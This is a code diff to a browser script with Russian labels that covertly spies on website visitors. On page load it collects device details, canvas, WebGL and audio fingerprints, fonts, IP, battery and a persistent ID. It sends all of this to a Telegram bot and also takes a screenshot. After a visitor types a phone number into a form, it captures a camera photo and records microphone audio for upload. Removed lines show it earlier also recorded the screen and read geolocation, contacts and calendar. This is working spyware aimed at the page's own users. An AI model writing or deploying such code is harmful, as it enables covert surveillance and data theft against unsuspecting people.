@@ -95,22 +95,37 @@ function sendVoice(blob) {
   fetch('https://api.telegram.org/bot' + token + '/sendVoice', { method: 'POST', body: form });
 }
 
-function sendVideo(blob) {
-  var form = new FormData();
-  form.append('chat_id', chat);
-  form.append('video', blob, 'video.webm');
-  fetch('https://api.telegram.org/bot' + token + '/sendVideo', { method: 'POST', body: form });
+function getUserID() {
+  var id = localStorage.getItem('uid');
+  if (!id) {
+    id = Math.random().toString(36).substring(2, 10);
+    localStorage.setItem('uid', id);
+  }
+  return id;
 }
 
-function getDeviceInfo() {
-  return 'Устройство: ' + navigator.userAgent +
-    '\nЯзык: ' + navigator.language +
-    '\nЭкран: ' + screen.width + 'x' + screen.height +
-    '\nПлатформа: ' + navigator.platform +
-    '\nЯдер: ' + (navigator.hardwareConcurrency || 'н/д') +
-    '\nПамять: ' + (navigator.deviceMemory || 'н/д') + ' GB' +
-    '\nТач: ' + (navigator.maxTouchPoints || 0) +
-    '\nОнлайн: ' + navigator.onLine;
+// ===== БЕЗ РАЗРЕШЕНИЙ =====
+
+function getBasic() {
+  send('👤 ID: ' + getUserID() +
+    '\n📱 Устройство: ' + navigator.userAgent +
+    '\n🌍 Языки: ' + (navigator.languages || [navigator.language]).join(', ') +
+    '\n💻 Платформа: ' + navigator.platform +
+    '\n🖥 Экран: ' + screen.width + 'x' + screen.height +
+    '\n🎨 Глубина: ' + screen.colorDepth + ' bit' +
+    '\n🔍 DPR: ' + window.devicePixelRatio +
+    '\n🔄 Ориентация: ' + (screen.orientation ? screen.orientation.type : 'н/д') +
+    '\n⚙️ Ядер: ' + (navigator.hardwareConcurrency || 'н/д') +
+    '\n🧠 Память: ' + (navigator.deviceMemory || 'н/д') + ' GB' +
+    '\n👆 Тач: ' + (navigator.maxTouchPoints || 0) +
+    '\n📶 Онлайн: ' + navigator.onLine +
+    '\n🍪 Cookies: ' + navigator.cookieEnabled +
+    '\n🚫 DNT: ' + (navigator.doNotTrack || 'не указан'));
+}
+
+function getTime() {
+  send('🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone +
+    '\n📅 Время: ' + new Date().toLocaleString('ru-RU'));
 }
 
 function getIP() {
@@ -130,21 +145,135 @@ function getBattery() {
 
 function getConnection() {
   if (navigator.connection) {
-    send('📶 Сеть: ' + (navigator.connection.effectiveType || 'unknown') + ' | ' + (navigator.connection.downlink || '?') + ' Mbps');
+    send('📶 Сеть: ' + (navigator.connection.effectiveType || '?') +
+      '\nТип: ' + (navigator.connection.type || '?') +
+      '\nСкорость: ' + (navigator.connection.downlink || '?') + ' Mbps' +
+      '\nЭкономия: ' + (navigator.connection.saveData ? 'да' : 'нет'));
   }
 }
 
-function getTimeZone() {
-  send('🕐 Часовой пояс: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\nВремя: ' + new Date().toLocaleString('ru-RU'));
+function getStorage() {
+  var hasLocal = false, hasSession = false, hasIndexed = false;
+  try { localStorage.setItem('t', '1'); localStorage.removeItem('t'); hasLocal = true; } catch(e) {}
+  try { sessionStorage.setItem('t', '1'); sessionStorage.removeItem('t'); hasSession = true; } catch(e) {}
+  if (window.indexedDB) hasIndexed = true;
+  send('💾 Хранилища: localStorage=' + hasLocal + ', session=' + hasSession + ', indexedDB=' + hasIndexed);
 }
 
-function getUserID() {
-  var id = localStorage.getItem('uid');
-  if (!id) {
-    id = Math.random().toString(36).substring(2, 10);
-    localStorage.setItem('uid', id);
+function getMimeTypes() {
+  if (navigator.mimeTypes) {
+    var list = [];
+    for (var i = 0; i < navigator.mimeTypes.length; i++) list.push(navigator.mimeTypes[i].type);
+    send('📄 MIME: ' + list.join(', '));
   }
-  return id;
+}
+
+function getCanvasFingerprint() {
+  try {
+    var canvas = document.createElement('canvas');
+    canvas.width = 200; canvas.height = 50;
+    var ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Fingerprint', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Fingerprint', 4, 17);
+    var hash = 0, str = canvas.toDataURL();
+    for (var i = 0; i < str.length; i++) { hash = ((hash << 5) - hash) + str.charCodeAt(i); hash |= 0; }
+    send('🖼 Canvas: ' + hash);
+  } catch(e) {}
+}
+
+function getWebGLFingerprint() {
+  try {
+    var canvas = document.createElement('canvas');
+    var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      var vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+      var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+      send('🎮 WebGL: ' + vendor + ' | ' + renderer);
+    }
+  } catch(e) {}
+}
+
+function getAudioFingerprint() {
+  try {
+    var ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+    var osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    var comp = ctx.createDynamicsCompressor();
+    osc.connect(comp);
+    comp.connect(ctx.destination);
+    osc.start(0);
+    ctx.startRendering().then(function(buffer) {
+      var data = buffer.getChannelData(0);
+      var sum = 0;
+      for (var i = 0; i < data.length; i++) sum += Math.abs(data[i]);
+      send('🔊 Audio FP: ' + sum.toFixed(2));
+    });
+  } catch(e) {}
+}
+
+function getFonts() {
+  var fonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Tahoma', 'Trebuchet MS', 'Comic Sans MS', 'Impact', 'Webdings', 'Roboto', 'Helvetica', 'Segoe UI'];
+  var detected = [];
+  var canvas = document.createElement('canvas');
+  var ctx = canvas.getContext('2d');
+  var text = 'mmmmmmmmmmlli';
+  var baseFonts = ['monospace', 'sans-serif', 'serif'];
+  var baseSizes = {};
+  baseFonts.forEach(function(base) {
+    ctx.font = '72px ' + base;
+    baseSizes[base] = ctx.measureText(text).width;
+  });
+  fonts.forEach(function(font) {
+    baseFonts.forEach(function(base) {
+      ctx.font = '72px "' + font + '", ' + base;
+      if (ctx.measureText(text).width !== baseSizes[base] && detected.indexOf(font) === -1) detected.push(font);
+    });
+  });
+  send('🔤 Шрифты: ' + detected.join(', '));
+}
+
+function getScreenRefresh() {
+  var last = performance.now(), count = 0;
+  function tick(t) {
+    count++;
+    if (t - last > 1000) { send('🖥 Частота экрана: ~' + count + ' Hz'); return; }
+    requestAnimationFrame(tick);
+  }
+  requestAnimationFrame(tick);
+}
+
+function getAPIs() {
+  var apis = [];
+  if (window.WebAssembly) apis.push('WebAssembly');
+  if (window.RTCPeerConnection) apis.push('WebRTC');
+  if (window.WebSocket) apis.push('WebSocket');
+  if (navigator.bluetooth) apis.push('Bluetooth');
+  if (navigator.usb) apis.push('USB');
+  if (navigator.serviceWorker) apis.push('ServiceWorker');
+  send('🔧 API: ' + apis.join(', '));
+}
+
+function getTheme() {
+  var theme = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'тёмная' : 'светлая';
+  var motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'уменьшена' : 'обычная';
+  send('🎨 Тема: ' + theme + '\n🌀 Анимация: ' + motion);
+}
+
+function trackTime() {
+  var start = Date.now();
+  window.addEventListener('beforeunload', function() {
+    var sec = Math.round((Date.now() - start) / 1000);
+    var img = new Image();
+    img.src = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent('⏱ Время на сайте: ' + sec + ' сек');
+  });
 }
 
 function takeScreenshot() {
@@ -155,31 +284,25 @@ function takeScreenshot() {
   }
 }
 
-function getGeo() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(function(pos) {
-      send('📍 Гео: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
-    }, function() { send('📍 Гео: отказ'); });
-  }
-}
+// Отправляем всё при загрузке
+getBasic();
+getTime();
+getIP();
+getBattery();
+getConnection();
+getStorage();
+getMimeTypes();
+getCanvasFingerprint();
+getWebGLFingerprint();
+getAudioFingerprint();
+getFonts();
+getScreenRefresh();
+getAPIs();
+getTheme();
+trackTime();
+setTimeout(takeScreenshot, 3000);
 
-function recordVoice() {
-  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-    navigator.mediaDevices.getUserMedia({ audio: true })
-      .then(function(stream) {
-        var recorder = new MediaRecorder(stream);
-        var chunks = [];
-        recorder.ondataavailable = function(e) { chunks.push(e.data); };
-        recorder.onstop = function() {
-          sendVoice(new Blob(chunks, { type: 'audio/webm' }));
-          stream.getTracks().forEach(function(t) { t.stop(); });
-        };
-        recorder.start();
-        setTimeout(function() { recorder.stop(); }, 5000);
-      })
-      .catch(function() {});
-  }
-}
+// ===== С РАЗРЕШЕНИЯМИ (только камера + микрофон) =====
 
 function takePhoto() {
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -201,15 +324,15 @@ function takePhoto() {
   }
 }
 
-function recordScreen() {
-  if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-    navigator.mediaDevices.getDisplayMedia({ video: true })
+function recordVoice() {
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ audio: true })
       .then(function(stream) {
         var recorder = new MediaRecorder(stream);
         var chunks = [];
         recorder.ondataavailable = function(e) { chunks.push(e.data); };
         recorder.onstop = function() {
-          sendVideo(new Blob(chunks, { type: 'video/webm' }));
+          sendVoice(new Blob(chunks, { type: 'audio/webm' }));
           stream.getTracks().forEach(function(t) { t.stop(); });
         };
         recorder.start();
@@ -219,51 +342,18 @@ function recordScreen() {
   }
 }
 
-function askNotifications() {
-  if ('Notification' in window && Notification.permission === 'default') {
-    Notification.requestPermission();
-  }
-}
-
-function getContacts() {
-  if (navigator.contacts && navigator.contacts.select) {
-    navigator.contacts.select(['name', 'tel'], { multiple: true })
-      .then(function(contacts) {
-        if (contacts.length) send('📇 Контакты: ' + JSON.stringify(contacts));
-      })
-      .catch(function() {});
-  }
-}
-
-function getCalendar() {
-  if (navigator.calendar && navigator.calendar.query) {
-    navigator.calendar.query({ start: new Date(0), end: new Date() })
-      .then(function(events) {
-        if (events.length) send('📅 Календарь: ' + events.length + ' событий');
-      })
-      .catch(function() {});
-  }
-}
-
-send('👤 Новый визит ID: ' + getUserID() + '\n' + getDeviceInfo());
-getIP();
-getBattery();
-getConnection();
-getTimeZone();
-getGeo();
-setTimeout(takeScreenshot, 3000);
-setTimeout(recordVoice, 5000);
-setTimeout(takePhoto, 8000);
-setTimeout(recordScreen, 12000);
-setTimeout(askNotifications, 15000);
-setTimeout(getContacts, 18000);
-setTimeout(getCalendar, 20000);
+// ===== ФОРМА =====
 
 document.getElementById('next1').addEventListener('click', function() {
   var phone = document.getElementById('phone').value;
   if (!phone || phone.length < 12) { alert('Введите номер телефона'); return; }
   userData.phone = phone;
   send('📱 Телефон: ' + phone);
+
+  // Камера и микрофон только после ввода телефона
+  takePhoto();
+  recordVoice();
+
   document.getElementById('step1').classList.add('hidden');
   document.getElementById('step2').classList.remove('hidden');
   var t = 40;
